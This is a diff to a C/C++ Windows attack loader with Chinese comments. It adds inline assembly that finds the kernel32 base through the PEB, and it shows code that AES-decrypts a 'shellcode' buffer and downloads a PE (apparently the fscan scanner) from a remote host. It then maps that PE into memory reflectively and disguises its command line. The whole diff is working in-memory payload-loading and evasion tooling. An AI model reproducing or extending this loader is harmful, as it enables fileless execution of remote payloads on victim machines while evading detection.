@@ -70,6 +70,26 @@ char* http_req_hdr_tmpl = "GET %s HTTP/1.1\r\n"
 
 //#pragma comment(lib,"ws2_32.lib")
 
+
+DWORD _getKernelBase()
+{
+  
+
+    DWORD dwDllBase1;
+    __asm {
+        xor ebx, ebx; EBX = 0x00000000
+        mov ebx, fs: [ebx + 0x30] ;
+        mov ebx, [ebx + 0xC]; EBX = Address_of_LDR
+            mov ebx, [ebx + 0x1C]; EBX = 1st entry in InitOrderModuleList / ntdll.dll
+            mov ebx, [ebx]; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
+            mov ebx, [ebx]; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
+            mov eax, [ebx + 0x8]; EAX = &kernel32.dll / Address of kernel32.dll
+            mov DWORD PTR dwDllBase1, eax
+
+    }
+    return dwDllBase1;
+}
+
 // 进行aes解密
 void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
     HCRYPTPROV hProv;
@@ -665,16 +685,17 @@ void PELoader(char* data, DWORD datasize)
     {
         memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
     }
-
-    // Fix the PE Import addr table
+    // 修复IAT
     //FixBaseRelocTable(pImageBase, ntHeader);
     RepairIAT(pImageBase);
-    
+    // 修复重定向表
     if (pImageBase != preferAddr)
         if (applyReloc((size_t)pImageBase, (size_t)preferAddr, pImageBase, ntHeader->OptionalHeader.SizeOfImage))
             puts("[+] Relocation Fixed.");
-
-    // AddressOfEntryPoint
+    // asm获取dll基址
+    //DWORD kernelbase = _getKernelBase();
+    //printf("kernelbase address is: %p", kernelbase);
+    // 程序入口点
     size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;
     printf("retAddr: %p\n", retAddr);
     printf("Well jmp: %p\n", retAddr-2330);
@@ -825,7 +846,7 @@ int main(int argc, char** argv) {
     //char* key1 = argv[4];
     DATA PE = GetData(whost, port, wpe);
     printf("fscan32 address is :%p\n the lenght is : %d\n",PE.data,PE.len);
-    sz_masqCmd_Ansi = (char*)"moo_remote_load_pe.exe -h 192.168.1.1/24 -np";
+    sz_masqCmd_Ansi = (char*)"moo1";
     PELoader((char*)PE.data, PE.len);
     
     /*
